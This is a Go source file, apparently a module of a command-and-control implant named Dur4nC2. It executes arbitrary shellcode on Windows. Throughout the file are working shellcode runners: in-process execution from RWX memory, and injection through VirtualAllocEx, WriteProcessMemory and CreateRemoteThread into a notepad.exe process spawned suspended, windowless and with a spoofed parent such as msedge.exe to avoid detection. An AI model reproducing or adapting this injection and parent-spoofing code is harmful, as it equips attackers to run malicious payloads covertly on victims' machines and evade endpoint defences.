package executions

import "C"
import (
	"fmt"
	"golang.org/x/sys/windows"
	"log"
	"strings"
	"syscall"
	"unsafe"
)

import (
	"Dur4nC2/implant/modules/syscalls"
	"errors"
)

// string mapping
const (
	SameProcess        string = "same"
	SacrificialProcess        = "sacrificial"
	SpoofedProcess            = "spoofed"
)

const TH32CS_SNAPPROCESS = 0x00000002

type WindowsProcess struct {
	ProcessID       int
	ParentProcessID int
	Exe             string
}

const (
	MEM_COMMIT                = 0x1000
	MEM_RESERVE               = 0x2000
	PAGE_EXECUTE_READWRITE    = 0x40
	PROCESS_CREATE_THREAD     = 0x0002
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_OPERATION      = 0x0008
	PROCESS_VM_WRITE          = 0x0020
	PROCESS_VM_READ           = 0x0010
)

var (
	kernel32            = syscall.MustLoadDLL("kernel32.dll")
	VirtualAllocEx      = kernel32.MustFindProc("VirtualAllocEx")
	WriteProcessMemory  = kernel32.MustFindProc("WriteProcessMemory")
	OpenProcess         = kernel32.MustFindProc("OpenProcess")
	WaitForSingleObject = kernel32.MustFindProc("WaitForSingleObject")
	CreateRemoteThread  = kernel32.MustFindProc("CreateRemoteThread")
	QueueUserAPC        = kernel32.MustFindProc("QueueUserAPC")
)

func RunShellcode(method string, shellcode []byte, pid string, parentName string, programPath string) {
	switch method {
	case SameProcess:
		inCurrentProcessInjectShellcode(shellcode)
		break
	case SacrificialProcess:
		sacrificialProcessInjectShellcode(pid, shellcode)
		break
	case SpoofedProcess:
		externalProcessInjectShellcode(shellcode, parentName, programPath)
		break
	}
}

// Sacrificial process injection
func sacrificialProcessInjectShellcode(pid string, shellcode []byte) {
	fmt.Println("non implemented")
}

// Simple in-line shellcode runner
func inCurrentProcessInjectShellcode(shellcode []byte) {
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	virtualAlloc := kernel32.MustFindProc("VirtualAlloc")
	rtlMoveMemory := kernel32.MustFindProc("RtlMoveMemory")
	createThread := kernel32.MustFindProc("CreateThread")
	waitForSingleObject := kernel32.MustFindProc("WaitForSingleObject")

	destAddress, _, _ := virtualAlloc.Call(0, uintptr(len(shellcode)), 0x1000|0x2000, 0x40)
	// note the use of shellcode[0] below - if the slice itself is used instead of its element, an access violation occurs
	// also, the unsafe.Pointer casting with uintptr needs to occur inline in order for the compiler to recognise this
	rtlMoveMemory.Call(destAddress, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	threadHandle, _, _ := createThread.Call(0, 0, destAddress, 0, 0)
	waitForSingleObject.Call(threadHandle, uintptr(^uint(0)))
}

// Create a fresh process spoofing the parent, allocate shellcode in it and execute it spawning a new thread
func externalProcessInjectShellcode(shellcode []byte, parentName string, programPath string) error {
	fmt.Println("Creating notepad.exe spoofed...")
	notedpadInfo, err := parentSpoofing(parentName, programPath)
	if err != nil {
		return err
	}
	proc, r_addr, f := WriteShellcode(int(notedpadInfo.ProcessId), shellcode)
	err = ShellCodeCreateRemoteThread(proc, r_addr, f)
	if err != nil {
		fmt.Println(err)
		return err
	}
	return nil
}

func parentSpoofing(parentName string, programPath string) (*windows.ProcessInformation, error) {
	procThreadAttributeSize := uintptr(0)
	syscalls.InitializeProcThreadAttributeList(nil, 2, 0, &procThreadAttributeSize)
	procHeap, err := syscalls.GetProcessHeap()
	attributeList, err := syscalls.HeapAlloc(procHeap, 0, procThreadAttributeSize)
	defer syscalls.HeapFree(procHeap, 0, attributeList)
	var startupInfo syscalls.StartupInfoEx
	startupInfo.AttributeList = (*syscalls.PROC_THREAD_ATTRIBUTE_LIST)(unsafe.Pointer(attributeList))
	syscalls.InitializeProcThreadAttributeList(startupInfo.AttributeList, 2, 0, &procThreadAttributeSize)
	//mitigate := 0x20007 //"PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY"

	procs, err := Processes()
	if err != nil {
		log.Fatal(err)
	}
	if parentName == "" {
		parentName = "msedge.exe"
	}
	ParentInfo := FindProcessByName(procs, parentName)
	if ParentInfo != nil {
		// found it

		//Spoof
		ppid := uint32(ParentInfo.ProcessID)
		parentHandle, _ := windows.OpenProcess(windows.PROCESS_CREATE_PROCESS, false, ppid)
		uintParentHandle := uintptr(parentHandle)
		syscalls.UpdateProcThreadAttribute(startupInfo.AttributeList, 0, syscalls.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &uintParentHandle, unsafe.Sizeof(parentHandle), 0, nil)

		var procInfo windows.ProcessInformation
		startupInfo.Cb = uint32(unsafe.Sizeof(startupInfo))
		startupInfo.Flags |= windows.STARTF_USESHOWWINDOW
		//startupInfo.ShowWindow = windows.SW_HIDE
		creationFlags := windows.CREATE_SUSPENDED | windows.CREATE_NO_WINDOW | windows.EXTENDED_STARTUPINFO_PRESENT
		//creationFlags := windows.CREATE_SUSPENDED | windows.EXTENDED_STARTUPINFO_PRESENT
		//creationFlags := windows.CREATE_NO_WINDOW | windows.EXTENDED_STARTUPINFO_PRESENT
		//creationFlags := windows.EXTENDED_STARTUPINFO_PRESENT
		if programPath == "" {
			programPath = "c:\\windows\\system32\\notepad.exe"
		}
		utfProgramPath, _ := windows.UTF16PtrFromString(programPath)
		syscalls.CreateProcess(nil, utfProgramPath, nil, nil, true, uint32(creationFlags), nil, nil, &startupInfo, &procInfo)
		return &procInfo, nil
	}
	return nil, errors.New("Process not found")
}

func Processes() ([]WindowsProcess, error) {
	handle, err := syscall.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return nil, err
	}
	defer syscall.CloseHandle(handle)

	var entry syscall.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))
	// get the first process
	err = syscall.Process32First(handle, &entry)
	if err != nil {
		return nil, err
	}

	results := make([]WindowsProcess, 0, 50)
	for {
		results = append(results, newWindowsProcess(&entry))

		err = syscall.Process32Next(handle, &entry)
		if err != nil {
			// windows sends ERROR_NO_MORE_FILES on last process
			if err == syscall.ERROR_NO_MORE_FILES {
				return results, nil
			}
			return nil, err
		}
	}
}

func FindProcessByName(processes []WindowsProcess, name string) *WindowsProcess {
	for _, p := range processes {
		if strings.ToLower(p.Exe) == strings.ToLower(name) {
			return &p
		}
	}
	return nil
}

func newWindowsProcess(e *syscall.ProcessEntry32) WindowsProcess {
	// Find when the string ends for decoding
	end := 0
	for {
		if e.ExeFile[end] == 0 {
			break
		}
		end++
	}

	return WindowsProcess{
		ProcessID:       int(e.ProcessID),
		ParentProcessID: int(e.ParentProcessID),
		Exe:             syscall.UTF16ToString(e.ExeFile[:end]),
	}
}

func WriteShellcode(PID int, Shellcode []byte) (uintptr, uintptr, int) {
	var F int = 0
	Proc, _, _ := OpenProcess.Call(PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ, uintptr(F), uintptr(PID))
	R_Addr, _, _ := VirtualAllocEx.Call(Proc, uintptr(F), uintptr(len(Shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	WriteProcessMemory.Call(Proc, R_Addr, uintptr(unsafe.Pointer(&Shellcode[0])), uintptr(len(Shellcode)), uintptr(F))
	return Proc, R_Addr, F
}

func ShellCodeCreateRemoteThread(Proc uintptr, R_Addr uintptr, F int) error {
	CRTS, _, _ := CreateRemoteThread.Call(Proc, uintptr(F), 0, R_Addr, uintptr(F), 0, uintptr(F))
	if CRTS == 0 {
		err := errors.New("[!] ERROR : Can't Create Remote Thread.")
		return err
	}

	//TODO fix this, the shellcode is executed but can't operate waitforsingleobject
	_, _, errWaitForSingleObject := WaitForSingleObject.Call(Proc, 0, syscall.INFINITE)
	if errWaitForSingleObject.Error() != "The operation completed successfully." {
		return errors.New("Error calling WaitForSingleObject:\r\n")
	}

	return nil
}
